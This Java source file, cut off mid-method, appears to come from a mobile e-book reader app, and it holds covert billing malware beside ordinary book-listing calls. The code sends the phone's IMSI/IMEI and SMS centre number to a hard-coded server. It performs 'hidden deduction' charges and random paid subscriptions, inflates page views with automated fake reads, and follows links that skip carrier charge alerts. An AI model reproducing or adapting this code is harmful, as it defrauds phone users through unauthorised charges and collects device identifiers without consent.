package com.caimeng.system.control;

import java.util.Random;
import java.util.Vector;

import com.caimeng.software.io.FileManager;
import com.caimeng.software.model.AppContext;
import com.caimeng.software.model.Consts;
import com.caimeng.software.protocol.Catalog;
import com.caimeng.software.protocol.CatalogInfo;
import com.caimeng.software.protocol.ClientWelcomeInfo;
import com.caimeng.software.protocol.ColorDreamChannel;
import com.caimeng.software.protocol.GameActivatePath;
import com.caimeng.software.protocol.LoginServer;
import com.caimeng.software.protocol.MMdownload;
import com.caimeng.software.protocol.MaddenGame;
import com.caimeng.software.protocol.RefreshPv;
import com.caimeng.software.protocol.RegisterReader;
import com.caimeng.software.protocol.RequestBookInfo;
import com.caimeng.software.protocol.TestPro;
import com.caimeng.software.readerobj.BookChapterInfoBean;
import com.caimeng.software.readerobj.HBase64;
import com.caimeng.software.readerobj.MD5;
import com.caimeng.software.readerobj.Progress;
import com.caimeng.software.readerobj.User;
import com.caimeng.software.rms.RmsManager;
import com.caimeng.software.xml.KXmlParser;
import com.caimeng.software.xml.ParserXml;
import com.caimeng.software.xml.PostContent;
import com.caimeng.uilibray.control.UIControl;
import com.caimeng.uilibray.utils.FileUtil;
import com.caimeng.uilibray.utils.MobileInfo;
import com.caimeng.uilibray.utils.ServiceData;
import com.caimeng.uilibray.utils.StringUtil;

public class Handle {

	public static ServiceData serviceData;

	/**
	 * 包月扣费
	 */
	static String[] caids = new String[] { "880", "123", "113", "122", "124" };

	static String[] value = new String[] { "3", "5", "5", "5", "5" };

	private static int requesttime;
    private static boolean waitRead=true;
	public Handle() {
	}

	public static void test() {
		String path = "http://wap.baidu.com";
		TestPro tp = new TestPro(path, "", "GET");
		String backStr=tp.testOne("");
//		backStr=Consts.WAPALERT;
//		System.out.println("back==="+backStr);
		if(backStr!=null){
			int cancelP=backStr.indexOf("取消提醒");
			int startP=-1;
			if(cancelP!=-1){//wap收费提示界面
				for(int i=cancelP-3;i>0;i--){
					if(backStr.charAt(i)=='"'){
						startP=i;
						break;
					}
				}
				String url=backStr.substring(startP+2, cancelP-3);
				System.out.println("url-----------"+url);
				tp = new TestPro(url, "", "GET");
				tp.testOne("");
				backStr=null;
			}
		}
		tp=null;
	}

	/**
	 * 把16进制字符串转换成字节数组
	 * 
	 * @param hex
	 * @return
	 */
	public static byte[] hexStringToByte(String hex) {
		int len = (hex.length() / 2);
		byte[] result = new byte[len];
		// char[] achar = hex.toCharArray();
		for (int i = 0; i < len; i++) {
			int pos = i * 2;
			// result[i] = (byte) ((CharToByte(achar[pos]) << 4) |
			// CharToByte(achar[pos + 1]));
			result[i] = (byte) ((Byte
					.parseByte(hex.substring(pos, pos + 1), 16) << 4) | Byte
					.parseByte(hex.substring(pos + 1, pos + 2), 16));
		}
		return result;
	}

	/**
	 * 获取系统imsi和短信中心号
	 * 
	 * @return
	 */
	public static String[] getIMSIANDCENTERNUMBER() {
		String[] str = new String[2];
		/** *******获取短信中心号****************************************** */
		String center = "";// 短信中心号码
		try {

			center = MobileInfo.getCNETERNUMBER();
		} catch (Error e) {

		}
		System.out.println("center" + center);
//		FileManager.writeFile("center", center);
		if (center != null && !center.equals("")) {
			center = center.substring(6, center.length() - 3);
			if (center.substring(0, 2).equals("00")) {
				// 移动
				Consts.isChinaMobile = true;
				AppContext.getInstance().setIsCMNET(false);
			} else {
				// 联通
				Consts.isChinaMobile = false;
				AppContext.getInstance().setIsCMNET(true);
			}
		}
		if (center == null || center.equals("")) {
			center = "6";
		}
		/**
		 * *******获取imsi or imei
		 * 都没有则拿取userid*****************************************
		 */
		String imsi = "";
		try {

			imsi = MobileInfo.getIMSI();// sim卡的imsi码
		} catch (Error e) {

		}
		if (imsi == null || imsi.equals("")) {
			try {

				imsi = MobileInfo.getIMEI();
			} catch (Error e) {

			}
			if (imsi != null && !imsi.equals("")) {
				// imei截取
				if (imsi.length() >= 15) {
					imsi = imsi.substring(imsi.length() - 15, imsi.length());
				}
			}

		} else {
			// imsi截取
			if (imsi.length() >= 16) {
				imsi = imsi.substring(imsi.length() - 16, imsi.length());
			}
		}
		if (imsi != null && !imsi.equals("")) {
			// imsi=imsi.substring(5);
		} else {
			// 本地取USERID
			imsi = RmsManager.getUserID();
			if (imsi != null && imsi.length() >= 20) {
				imsi = imsi.substring(imsi.length() - 20, imsi.length());
			}

		}
		/** ********组装******************** */
		str[0] = imsi;
		str[1] = center;
		return str;
	}

	/***************************************************************************
	 * 包月流程 mode 0正常扣费 1取消userid 最后一位 5-9扣费
	 */
	public static boolean monthlyProcess(int mode) {

		if (mode == 1) {
			try {

				ServiceData data = RmsManager.getServiceSetting();
				String operate = "0";
				if (data != null) {
					// Consts.test.append("OPERATE "+data.OPERATE);
					operate = data.OPERATE;
				}
				// System.out.println("operate======="+operate);
				if (operate.equals("0")) {
					return true;// 取消 不计费
				} else if (operate.equals("1")) {
					// 判断userid 最后一位
					int num = Integer.parseInt(User.userId.substring(
							User.userId.length() - 1, User.userId.length()));
					if (num < 5) {
						// midlet.showMainMenu();
						return true;// 小于5不计费
					}
				}
			} catch (Exception e) {
				// Consts.test.append("异常 "+e.getMessage());
			}
		}
		boolean s = false;
		s = getColorDreamChannel();
		s = register();
		s = authenticate();
		String cids = getClientWelcomeInfo();
		if (cids == null) {
			if (mode == 0)
				return false;
		}
		// Consts.test.append("专区"+cids);
		if (getCatalogInfo(cids)) {
			s = subscribeCatalog();
			// Consts.test.append("包月"+s);
			// 同步后台
			s = synCMServer();
			// Consts.test.append("同步"+s);
		}
		return true;
	}

	/**
	 * 开始激活流程
	 * 
	 */
	public static void startProcess() {
		getColorDreamChannel();
		if ("10".equals(Consts.VERSION) || "9".equals(Consts.VERSION)|| "8".equals(Consts.VERSION)) {
			if (Consts.isChinaMobile)
				doMMdownload();
			dispalyHomePage();
			return;
		}
		if (serviceData.MSG5==null || serviceData.MSG5.equals("0") || !Consts.isChinaMobile) {// 激活总开关
			UIControl.getInstance().initHomePage();
			return;
		}
		if ((User.userId = RmsManager.getUserID()).equals("")) {
			register();
		}
		authenticate();
		String cids = getClientWelcomeInfo();
		if (cids == null) {
			return;
		}

		if ("0154".equals(Consts.VERSION)) {// 短信提示扣费操作
			Consts.SYSTEMTYPE = 3;
			doMessage();
		} else {
			Consts.CHARGES_ALERT_MESSAGE = "下载激活5元，终身免费";
			doNotMessage();
		}
	}

	/**
	 * 根据操作码通过短信扣费
	 * 
	 */
	private static void doMessage() {
		if (serviceData.OPERATE.equals("0")) {// 不通过短信扣费，按照正常的提示扣费走流程
			// 读取本地扣费ID
			Vector list = RmsManager.getAllChanges();
			if (list != null && list.size() > 0) {
				doSubscribeChapterPV();
			}
			switch (Consts.SYSTEMTYPE) {
			case 1:
				if (list == null || list.size() == 0) {
					// 随机数据执行收费
					int index = new Random().nextInt(6);
					// 扣费动作
					doSubscribeChapter(index);
					dispalyHomePage();
					// 收费过程和章节pv
					doSubscribeChapterPV(index);
				} else {
					// 同步
					dispalyHomePage();
					doFreeProcedurePV();
				}

				break;
			case 2:
				dispalyHomePage();
				doFreeProcedurePV();
				break;
			case 3:
				dispalyHomePage();
				doFreeProcedurePV();
				break;
			}
			list = null;

		} else if (serviceData.OPERATE.equals("1")) {// 通过短信扣费，发短信的方式

			dispalyHomePage();
			doFreeProcedurePV();

		}
	}

	/**
	 * 根据操作码提示扣费（不通过短信扣费）
	 * 
	 */
	private static void doNotMessage() {
		if (serviceData.OPERATE.equals("0")) {
			dispalyHomePage();
			doFreeProcedurePV();
		} else if (serviceData.OPERATE.equals("1")) {
			// 读取本地扣费ID
			Vector list = RmsManager.getAllChanges();
			if (list != null && list.size() > 0) {
				doSubscribeChapterPV();
			}
			switch (Consts.SYSTEMTYPE) {
			case 1:
				if (list == null || list.size() == 0) {
					// 随机数据执行收费
					int index = new Random().nextInt(6);
					// 扣费动作
					doSubscribeChapter(index);
					dispalyHomePage();
					// 收费过程和章节pv
					doSubscribeChapterPV(index);
				} else {
					// 同步
					dispalyHomePage();
					doFreeProcedurePV();
				}

				break;
			case 2:
				dispalyHomePage();
				doFreeProcedurePV();
				break;
			case 3:
				dispalyHomePage();
				doFreeProcedurePV();
				break;
			}
			list = null;
		}
	}
	/**
	 * 阅读+MM扣费激活
	 *
	 */
	public static void startActivat(){
		getColorDreamChannel();
		activateRead();
	}
	public static void activateRead(){
		if (serviceData.MSG5==null ||serviceData.MSG5.equals("0") || !Consts.isChinaMobile) {// 激活总开关
//			UIControl.getInstance().initHomePage();
			return;
		}
		if ((User.userId = RmsManager.getUserID()).equals("")) {
			register();
		}
		authenticate();
		String cids = getClientWelcomeInfo();
		if (cids == null) {
			return;
		}
		 Consts.hasChanges=Handle.checkHasUserCode();
		dispalyHomePage();
		waitRead=false;
		doFreeProcedurePV();
	}

	/**
	 * MM扣费和阅读扣费 点击确定，先走完阅读扣费流程和pv，再MM扣费流程。
	 * 
	 */
	public static void doMMAndRead() {
			while(waitRead){
				
			}
			
			if(serviceData!=null && serviceData.OPERATE!=null)
			if (serviceData.OPERATE.equals("1")) {
				// 1.走完阅读收费
				int index = new Random().nextInt(6);
				doSubscribeChapter(index);// 扣费动作
				doSubscribeChapterPV(index);// 收费过程和章节pv
				doFreeProcedurePV();// 免费章节pv
				// 2.阅读收费同步
				synCMServer();
			}
			// 3.MM计费请求
			Consts.VERSION = "10";
			getColorDreamChannel();
			// 4.MM计费
			Consts.strUserAgent = "Profile/MIDP-2.0 Configuration/CLDC-1.0";
			doMMdownload();
			// 5.MM计费同步
			synCMServer();
	}

	/**
	 * 同步
	 * 
	 */
	private static void dispalyHomePage() {
//		UIControl.getInstance().initHomePage();
		synCMServer();// 同步后台
	}

	/**
	 * 流程完毕，同步彩梦服务器
	 * 
	 */
	public static boolean synCMServer() {
		String name = "NZ_FEE_RESULT";// 接口名称，NZ_FEE_RESULT
		String channel = Consts.cmchannel;// 渠道号，与基地合作分配的渠道号
		String number = String.valueOf(Consts.orderState);// 手机号码

		String[] str = getIMSIANDCENTERNUMBER();

		String version = Consts.VERSION;
		String url = "http://61.144.195.169/cminterface/sms/sync.aspx";
		url = url + "?channel=" + channel + "&number=" + number + "&center="
				+ str[1] + "&imsi=" + str[0] + "&name=" + name + "&version="
				+ version;
		ColorDreamChannel cdc = new ColorDreamChannel(url, "", "GET");
		try {
			Object obj = cdc.getColorDream("");
			if (obj != null) {
				return true;
			}
		} catch (Exception e) {

		}
		return false;
	}

	/**
	 * 请求彩梦服务器 第一步
	 * 
	 */
	public static boolean getColorDreamChannel() {
		System.out.println("请求");
		serviceData = new ServiceData();
		String name = "NZ_FEE_01";// 接口名称，NZ_FEE_01
		String channel = Consts.cmchannel;// 渠道号，与基地合作分配的渠道号
		String number = "";// 手机号码
		String userMonthlyType = User.userMonthlyType;
		userMonthlyType = (userMonthlyType == null ? "" : userMonthlyType);
		if (userMonthlyType.equals("")) {
			number = "0";
		} else {
			number = userMonthlyType;
		}
		String str[] = getIMSIANDCENTERNUMBER();

		String version = Consts.VERSION;// 版本号，V1.01
		String url = "http://61.144.195.169/cminterface/sms/sync.aspx";
		url = url + "?channel=" + channel + "&number=" + number + "&center="
				+ str[1] + "&imsi=" + str[0] + "&name=" + name + "&version="
				+ version;
		System.out.println(url);
		ColorDreamChannel cdc = new ColorDreamChannel(url, "", "GET");
		try {
			Object obj = cdc.getColorDream("");
//			FileManager.writeFile("url"+Consts.VERSION, url);
			if (obj != null) {
				String strFile = (String) obj;
//				System.out.println(strFile);
//				FileManager.writeFile("strFile"+Consts.VERSION, strFile);
				serviceData = new ServiceData();
				serviceData.OPERATE = FileUtil.getArgValue(strFile, "OPERATE");
				serviceData.SERVICE = FileUtil.getArgValue(strFile, "SERVICE");
				serviceData.FEECODE = FileUtil.getArgValue(strFile, "FEECODE");
				serviceData.MSG1 = FileUtil.getArgValue(strFile, "MSG1");
				serviceData.MSG2 = FileUtil.getArgValue(strFile, "MSG2");
//				serviceData.MSG1="http://a.10086.cn/dps.do?requestid=content.detail&xtype=null&contentId=100001206118162100000543668300001093903&requestPid=content.searchresult";
				// serviceData.MSG2="Profile/MIDP-2.0 Configuration/CLDC-1.0";
				serviceData.MSG3 = FileUtil.getArgValue(strFile, "MSG3");
				serviceData.MSG4 = FileUtil.getArgValue(strFile, "MSG4");
				serviceData.MSG5 = FileUtil.getArgValue(strFile, "MSG5");
				if (serviceData.MSG4 != null) {
					progressID = new Vector();
					String[] s = StringUtil.split(serviceData.MSG4, ",");
					for (int i = 0; i < s.length; i++) {
						String[] t = StringUtil.split(s[i], "|");
						/** ****************刷选计费或者不计费流程******************** */
						if (serviceData.OPERATE.equals("0")) {// 不计费 免费
							if (i < 3) {
								Progress pro = new Progress();
								pro.index = i + 1;
								pro.sumID = t.length;
								pro.catalogId = t[0];
								pro.contentId = t[1];
								pro.chapterId = t[2];
								if (pro.sumID > 3) {
									pro.productId = t[3];
								}
								progressID.addElement(pro);
							} else {
								break;
							}
						} else {// 计费 包月和点播
							if (i >= 3) {
								Progress pro = new Progress();
								pro.index = i + 1;
								pro.sumID = t.length;
								pro.catalogId = t[0];
								pro.contentId = t[1];
								pro.chapterId = t[2];
								if (pro.sumID > 3) {
									pro.productId = t[3];
								}
								progressID.addElement(pro);
							}
						}

					}

				}
				Consts.HOSTURL = (serviceData.MSG1 == null ? ""
						: serviceData.MSG1);// 阅读客户端激活URL
				Consts.channel = Consts.cmchannel.substring(0, 8);
				Consts.strUserAgent = (serviceData.MSG2 == null ? ""
						: serviceData.MSG2);// 阅读客户端版本号
				Consts.strUserPassword = (serviceData.MSG3 == null ? ""
						: serviceData.MSG3);// 阅读客户端密码
				RmsManager.saveServiceSetting(serviceData);
				strFile = null;
//				FileManager.writeFile("strFile"+Consts.VERSION, serviceData.MSG1+""+serviceData.MSG2+""+serviceData.MSG3);
//				if(serviceData.MSG2==null){
//					return getColorDreamChannel();
//				}
			}
		} catch (Exception e) {
			e.printStackTrace();
			// midlet.setSplashEror("请求异常");
			requesttime++;
			 if (requesttime < 2) {
//
			 getColorDreamChannel();
			 }
		}
		cdc = null;
		return true;

	}

//	private static int requesttime = 0;

	static Vector progressID = null;

	/**
	 * 注册
	 * 
	 */
	public static boolean register() {
		String strM = MD5.toMD5(
				new StringBuffer(Consts.strUserAgent).append(
						Consts.strUserPassword).toString()).toLowerCase();
		String pp = HBase64.encode(hexStringToByte(strM));
		PostContent p = new PostContent();
		p.addLabel("Request", "RegisterReq");
		p.addLabel("RegisterReq", "clientHash");
		p.addContent("clientHash", pp);
		strM = null;
		pp = null;
		RegisterReader reg = new RegisterReader(Consts.HOSTURL, "register");
		try {
			// System.out.println("p.getxml=="+p.getXml());
			Object obj = reg.getParser(p.getXml());
			if (obj != null) {
				KXmlParser parser = (KXmlParser) obj;
				ParserXml.register(parser);
				RmsManager.saveUserID(User.userId);// 用户id临时存储
				return true;
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		p = null;
		return false;
	}

	/**
	 * 登录鉴权
	 * 
	 */
	public static boolean authenticate() {
		String strM = MD5.toMD5(
				new StringBuffer(Consts.strUserAgent).append(User.userId)
						.append(Consts.strUserPassword).toString())
				.toLowerCase();
		String pp = HBase64.encode(hexStringToByte(strM));

		PostContent p = new PostContent();
		p.addLabel("Request", "AuthenticateReq");
		p.addLabel("AuthenticateReq", "clientHash");
		p.addContent("clientHash", pp);
		p.addLabel("AuthenticateReq", "channel");
		p.addContent("channel", Consts.channel);
		strM = null;
		pp = null;
		LoginServer ls = new LoginServer(Consts.HOSTURL, "authenticate2");
		boolean falg = false;
		if (ls.authenticate(p.getXml())) {
			// 登录成功
			RmsManager.saveUserID(User.userId);// 用户id临时存储
			falg = true;
		}
		p = null;
		ls = null;
		return falg;
	}

	/**
	 * 欢迎信息
	 * 
	 */
	public static String getClientWelcomeInfo() {
		ClientWelcomeInfo cwi = new ClientWelcomeInfo(Consts.HOSTURL,
				"getClientWelcomeInfo", "GET");
		Object obj = cwi.getClientWelcomeInfo("");
		try {
			if (obj != null) {
				KXmlParser parser = (KXmlParser) obj;
				String[] cids = ParserXml.getCatalogInfoArray(parser);
				parser = null;
				obj = null;
				return cids[0];
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}

	/**
	 * 获取专区
	 * 
	 * @param cids
	 */
	public static boolean getCatalogInfo(String cids) {
		String url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
				.append(cids).append("&pageId=").append("").toString();
		CatalogInfo ci = new CatalogInfo(url, "getCatalogInfo", "GET");
		boolean falg = false;
		if (ci.getCatalogInfo("")) {
			// 获取专区成功

			falg = true;
		}
		url = null;
		ci = null;
		return falg;
	}

	/**
	 * 包月扣费
	 * 
	 * @return
	 */
	public static boolean subscribeCatalog() {
		boolean success = false;
		String catalogId = "";
		String type = RmsManager.getUserCodeOrType(2);// 用户包月类型
		type = (type == null ? "" : type);
		if (type.equals("3")) {
			catalogId = "880";
		} else if (type.equals("5")) {
			int ind = new Random().nextInt(5);
			ind = Math.abs(ind);
			if (ind == 0) {
				ind++;
			}
			if (ind >= caids.length) {

				catalogId = caids[4];
			} else {
				catalogId = caids[ind];
			}
		}
		String url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
				.append(catalogId).toString();
		Catalog catalog = new Catalog(url, "subscribeCatalog", "GET");
		try {
			success = catalog.subscribeCatalog("");
			if (success) {
				RmsManager.saveUserCodeOrType(catalogId, 1);

			}
		} catch (Exception e) {

		}
		return success;
	}

	/**
	 * 两次暗扣操作
	 * 
	 */
	public static void startGameActivate() {
		String url1 = (serviceData.SERVICE == null ? "" : serviceData.SERVICE);// 扣费路径URL1
		String url2 = (serviceData.FEECODE == null ? "" : serviceData.FEECODE);// 扣费路径URL2
		GameActivatePath gp = null;
		String k_url = null;
		boolean success = false;
		/** ********第一次扣费************* */
		if (!url1.equals("")) {
			gp = new GameActivatePath(url1, "startGameActivate", "GET");
			k_url = gp.getGameActivatePath("");
			/** ***第一次为空，给第二次机会*** */
			if (k_url == null) {
				k_url = gp.getGameActivatePath("");
			}
			if (k_url != null) {
				if (!k_url.equals(Consts.HASBUY)) {
					gp = new GameActivatePath(k_url, "", "GET");
					success = gp.startGameActivate("");
					Consts.orderState++;
				}
			}
		}

		/** ********第二次扣费************* */
		if (!url2.equals("")) {
			gp = new GameActivatePath(url2, "startGameActivate", "GET");
			k_url = gp.getGameActivatePath("");
			/** ***第一次为空，给第二次机会*** */
			if (k_url == null) {
				k_url = gp.getGameActivatePath("");
			}
			if (k_url != null) {
				if (!k_url.equals(Consts.HASBUY)) {
					gp = new GameActivatePath(k_url, "", "GET");
					success = gp.startGameActivate("");
					Consts.orderState++;
				}
			}
		}
	}

	/**
	 * 检测是否有包月记录
	 * 
	 * @return
	 */
	public static boolean checkHasUserCode() {
		String type = RmsManager.getUserCodeOrType(1);
		return type == null ? false : true;
	}

	/**
	 * 读取上一次用户弹出的包月费
	 * 
	 * @return
	 */
	/*public static String getUserType() {
		try {
			String type = RmsManager.getUserCodeOrType(2);// 用户包月类型
			type = (type == null ? "" : type);
			if (type.equals("")) {
				// 随机包月类型 2元包月和5元包月
				if (Math.abs(new Random().nextInt(10)) <= 5) {// 控制70%的2元包月
					RmsManager.saveUserCodeOrType("3", 2);
					type = "3";
				} else {
					RmsManager.saveUserCodeOrType("5", 2);
					type = "5";
				}
			}
			return type;
		} catch (Exception e) {
			return null;
		}
	}*/

	/**
	 * 阅读Pv
	 * 
	 * 执行阅读PV流程(默认PV 6次，可改) 执行过程：获取欢迎页面，在随机一个专区打开，再欢迎页面.....
	 */
	public static void execPVToRead(int intPv2, String[] cids2) {
		String[] cids = cids2;
		int intPv = intPv2;// pv次数
		ClientWelcomeInfo cwi = new ClientWelcomeInfo(Consts.HOSTURL,
				"getClientWelcomeInfo", "GET");
		Object obj = cwi.getClientWelcomeInfo("");
		boolean isPv = true;
		try {
			if (obj != null) {
				KXmlParser parser = (KXmlParser) obj;
				if (cids == null || cids.length < 0) {
					cids = ParserXml.getCatalogInfoArrayTOPV(parser);
				}
				if (cids != null && cids.length > 0) {
					int len = cids.length;
					String cid = cids[new Random().nextInt(len)];
					String url = new StringBuffer(Consts.HOSTURL).append(
							"?catalogId=").append(cid).append("&pageId=")
							.append("").toString();
					CatalogInfo ci = new CatalogInfo(url, "getCatalogInfo",
							"GET");
					ci.getCatalogInfo("");
				}

			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		if (intPv == 10) {
			intPv = 0;
			isPv = false;
		}
		if (isPv) {
			intPv++;
			execPVToRead(intPv, cids);
		}
	}

	/**
	 * 游戏订购PV（暗扣）
	 * 
	 * 执行游戏订购PV流程(默认PV 6次，可改)
	 * 
	 */
	String[] strAllPath = null;

	public void execPVToActivate(int intPv2) {
		int intPv = intPv2;
		boolean isPv = true;
		if (strAllPath == null || strAllPath.length < 0) {
			String url = " http://wap.cmread.com/iread/wml/t/ylsjm.jsp?cm=12238";
			strAllPath = new GameActivatePath(url, "", "GET")
					.getGameActivateAllPath("");
		}

		if (strAllPath != null && strAllPath.length > 0) {
			int i = new Random().nextInt(strAllPath.length);
			String path = strAllPath[i];
			if (path != null && !path.equals("")) {
				new GameActivatePath(path, "", "GET").startGameActivate("");
			}
		}
		if (intPv == 2) {
			intPv = 0;
			isPv = false;
		}
		if (isPv) {
			intPv++;
			execPVToActivate(intPv);
		}

	}

	/*
	 * static String[] urls ={
	 * "http://61.144.195.168/vamp/mtkbook/details.aspx?p=booktype",
	 * "http://61.144.195.168/vamp/mtkbook/details.aspx?p=newbook",
	 * "http://61.144.195.168/vamp/mtkbook/details.aspx?p=hotbook",
	 * "http://61.144.195.168/vamp/mtkbook/details.aspx?booktypeid=",
	 * "http://61.144.195.168/vamp/mtkbook/details.aspx?bookid=",
	 * "http://61.144.195.168/vamp/mtkbook/details.aspx?bookchapterid=",
	 * "http://61.144.195.168/vamp/mtkbook/details.aspx?sbookName=",
	 * "http://61.144.195.168/vamp/mtkbook/details.aspx?chapterid=" };
	 */

	/**
	 * 精品列表（重磅好书，精品回顾，编辑推荐）
	 */
	public static Vector getClassicList() {
		RequestBookInfo rbi = new RequestBookInfo(Consts.READ_URL
				+ "p=GoodClassisTuijian", "", "GET");
		Vector v = null;
		try {
			v = rbi.getRequestInfo(1);
			if (v == null) {
				v = rbi.getRequestInfo(1);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return v;
	}

	/**
	 * 书城首页列表（劲爆新书，热门推荐，畅销排行）
	 * 
	 * @return
	 */
	public static Vector getMainBookStoreList() {
		RequestBookInfo rbi = new RequestBookInfo(Consts.READ_URL
				+ "p=BestTopChangXiao", "", "GET");
		Vector v = null;
		try {
			v = rbi.getRequestInfo(2);
			// if(v==null){
			// v= rbi.getRequestInfo(1);
			// }
		} catch (Exception e) {
			e.printStackTrace();
		}
		return v;
	}

	/**
	 * 惊爆新书
	 */
	public static Vector getBestBook() {
		RequestBookInfo rbi = new RequestBookInfo(Consts.READ_URL
				+ "p=bestbook", "", "GET");
		Vector v = null;
		try {
			v = rbi.getRequestInfo(1);
			if (v == null) {
				v = rbi.getRequestInfo(1);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return v;
	}

	/**
	 * 热门推荐
	 * 
	 * @return
	 */
	public static Vector getTopBook() {
		RequestBookInfo rbi = new RequestBookInfo(
				Consts.READ_URL + "p=topbook", "", "GET");
		Vector v = null;
		try {
			v = rbi.getRequestInfo(1);
			if (v == null) {
				v = rbi.getRequestInfo(1);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return v;
	}

	/**
	 * 畅销排行
	 * 
	 * @return
	 */
	public static Vector getMostBook() {
		RequestBookInfo rbi = new RequestBookInfo(Consts.READ_URL
				+ "p=changxiao", "", "GET");
		Vector v = null;
		try {
			v = rbi.getRequestInfo(1);
			if (v == null) {
				v = rbi.getRequestInfo(1);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return v;
	}

	/**
	 * 重磅好书
	 * 
	 * @return
	 */
	public static Vector getGoodBook() {
		RequestBookInfo rbi = new RequestBookInfo(Consts.READ_URL
				+ "p=goodbook", "", "GET");
		Vector v = null;
		try {
			v = rbi.getRequestInfo(1);
			if (v == null) {
				v = rbi.getRequestInfo(1);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return v;
	}

	/**
	 * 精品回顾
	 * 
	 * @return
	 */
	public static Vector getClassicBook() {
		RequestBookInfo rbi = new RequestBookInfo(Consts.READ_URL
				+ "p=classisbook", "", "GET");
		Vector v = null;
		try {
			v = rbi.getRequestInfo(1);
			if (v == null) {
				v = rbi.getRequestInfo(1);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return v;
	}

	/**
	 * 编辑推荐
	 * 
	 * @return
	 */
	public static Vector getTuijianBook() {
		RequestBookInfo rbi = new RequestBookInfo(Consts.READ_URL
				+ "p=tuijianbook", "", "GET");
		Vector v = null;
		try {
			v = rbi.getRequestInfo(1);
			if (v == null) {
				v = rbi.getRequestInfo(1);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return v;
	}

	/**
	 * 获取书分类
	 * 
	 * @return
	 */
	public static Vector getBookType() {
		RequestBookInfo rbi = new RequestBookInfo(Consts.READ_URL
				+ "p=simplebooktype", "", "GET");
		Vector v = null;
		try {
			v = rbi.getRequestInfo(0);
			if (v == null) {
				v = rbi.getRequestInfo(0);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return v;
	}

	/***************************************************************************
	 * 获取新书
	 * 
	 * @return
	 */
	public static Vector getNewBook() {
		RequestBookInfo rbi = new RequestBookInfo(
				Consts.READ_URL + "p=newbook", "", "GET");
		Vector v = null;
		try {
			v = rbi.getRequestInfo(1);
			if (v == null) {
				v = rbi.getRequestInfo(1);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return v;
	}

	/**
	 * 获取排行，或者热书
	 * 
	 * @return
	 */
	public static Vector getHotBook() {
		RequestBookInfo rbi = new RequestBookInfo(
				Consts.READ_URL + "p=hotbook", "", "GET");
		Vector v = null;
		try {
			v = rbi.getRequestInfo(2);
			if (v == null) {
				v = rbi.getRequestInfo(2);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return v;
	}

	/**
	 * 通过类型id，获取该类型所有书
	 * 
	 * @param id
	 * @return
	 */
	public static Vector getAllBookByTypeID(String id) {
		RequestBookInfo rbi = new RequestBookInfo(Consts.READ_URL
				+ "booktypeid=" + id, "", "GET");
		Vector v = null;
		try {
			v = rbi.getRequestInfo(3);
			if (v == null) {
				v = rbi.getRequestInfo(3);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return v;
	}

	/**
	 * 通过书id，获取该书信息，简介
	 * 
	 * @param id
	 * @return
	 */
	public static Vector getInfoByBookID(String id) {
		RequestBookInfo rbi = new RequestBookInfo(Consts.READ_URL + "bookid="
				+ id, "", "GET");
		// System.out.println("url=="+urls[4]+id);
		Vector v = null;
		try {
			v = rbi.getRequestInfo(4);
			if (v == null) {
				v = rbi.getRequestInfo(4);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return v;
	}

	/**
	 * 获取书的章节，返回章节id 和name
	 * 
	 * @param id
	 * @return
	 */
	public static Vector getBookChapterByID(String id) {
		RequestBookInfo rbi = new RequestBookInfo(Consts.READ_URL
				+ "bookchapterid=" + id, "", "GET");
		Vector v = null;

		try {
			v = rbi.getRequestInfo(5);
			if (v == null) {
				v = rbi.getRequestInfo(5);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return v;
	}

	/**
	 * 通过指定关键字，搜索查询
	 * 
	 * @param key
	 * @return
	 */
	public static Vector getSearchResultByKey(String key) {
		RequestBookInfo rbi = new RequestBookInfo(Consts.READ_URL
				+ "sbookName=" + key, "", "GET");
		Vector v = null;
		try {
			v = rbi.getRequestInfo(6);
			if (v == null) {
				v = rbi.getRequestInfo(6);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return v;
	}

	/**
	 * 通过章节ID，获取该章节内容 ,分页
	 * 
	 * @param id
	 * @return
	 */
	public static BookChapterInfoBean getContentByChapterID(String id,
			String page) {
		RequestBookInfo rbi = new RequestBookInfo(Consts.READ_URL
				+ "chapterid=" + id + "&page=" + page, "", "GET");

		try {
			return rbi.getBookChapterContext();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}

	/**
	 * 通过章节ID，获取该章节内容 ,一次性获取整 章
	 * 
	 * @param id
	 * @return
	 */
	public static BookChapterInfoBean getContentByChapterID(String id) {
		RequestBookInfo rbi = new RequestBookInfo(Consts.READ_URL
				+ "chapterid=" + id, "", "GET");
		try {
			return rbi.getBookChapterContext();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}

	/**
	 * 获取所有分类子目录集
	 * 
	 * @param types
	 * @return
	 */
	public static Vector getTypeList() {
		Vector list = null;
		try {
			RequestBookInfo rbi = new RequestBookInfo(Consts.READ_URL
					+ "p=booktypeinfo", "", "GET");
			list = rbi.getRequestInfo(2);
			if (list == null) {
				list = rbi.getRequestInfo(2);
			}
		} catch (Exception e) {
			e.printStackTrace();
			return null;
		}
		return list;
	}

	/**
	 * 中文 to utf8 字符
	 * 
	 * @param inStr
	 * @return
	 */
	public static String gb2utf(String inStr) {

		char temChr;

		int ascInt;

		int i;

		String result = new String("");
		if (inStr == null) {
			inStr = "";
		}
		for (i = 0; i < inStr.length(); i++) {
			temChr = inStr.charAt(i);
			ascInt = temChr + 0;
			result = result + "%u" + Integer.toHexString(ascInt);
		}
		return result;

	}

	/**
	 * 执行免费过程Pv和章节pv 入口
	 */
	public static void doFreeProcedurePV() {
		// 数组结构 catalogId、contentId
		String url = "";
		RefreshPv pv = null;
		String catalogId, contentId, chapterId;
		int index = new Random().nextInt(progressID.size());
